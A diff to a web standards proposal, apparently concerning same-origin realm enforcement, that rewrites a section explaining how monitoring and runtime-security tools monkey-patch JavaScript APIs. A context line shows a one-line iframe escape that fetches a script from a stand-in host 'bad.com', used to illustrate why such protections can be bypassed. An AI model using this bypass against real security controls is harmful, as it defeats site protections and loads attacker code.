@@ -230,17 +230,13 @@ This proposal aims to solve this, by enabling the top-level document to guarante
 
 ### Application Monitoring (security / errors / performance / ux)
 
-The ability to provide successful monitoring services for web applications heavily relies on the stage in which they are included within the different JavaScript realms of the app they're expected to monitor.
+Many application monitoring services rely on overriding ("monkey patching") Javascript and DOM APIs in order to know and control when and how they are called.
 
-Once installed, such services emulate the behaviour of different JavaScript APIs by hooking into them at runtime (aka "monkey patching") which then allows them to monitor the behaviour of the application as well as alter it.
+This is done to measure these API's performance or to use those API calls to inform other performance measurements, detect runtime errors, or to inspect how apps are being used in order to enhance their UX.
 
-By "monitoring" we really mean either tracking the app for errors or performance issues, studying app usage for UX enhancement, applying runtime security to it and more.
+In other cases, the same methods are used to apply runtime security. The security aspect is particularly sensitive to the timing in which the API override happens.
 
-However, not being able to enforce such services to all same origin realms of the app (as opposed to its top most realm only), significantly narrows down the reach such services have.
-
-While true for all use cases mentioned above, it is the security aspect to which this applies the most.
-
-That is because that while for the other use cases, missing on some same origin realms in the app isn't necessarily crucial, within the boundaries of security, attackers can leverage such ungoverned same origin realms to escape applied runtime security.
+While missed overrides are not-ideal for other use cases, when used for security enforcement, attackers can leverage such ungoverned same origin realms to escape applied runtime security.
 
 To stress this even more, virtualizing the behaviour of JavaScript APIs to monitor/mitigate/block what malicious JavaScript code can do, such as by redefining the behaviour of `fetch`:
 
@@ -259,6 +255,8 @@ is effectively meaningless as long as attackers can bypass this by escaping into
 ```javascript
 document.body.appendChild(document.createElement('iframe')).contentWindow.fetch('//bad.com/bad.js');
 ```
+
+The conclusion is that not being able to enforce such services at a very specific time (earlier than all other scripts) to all same origin realms of the app (as opposed to its top most realm only), significantly narrows down the reach such services have, which attackers can abuse.
 
 ## Discussion
 
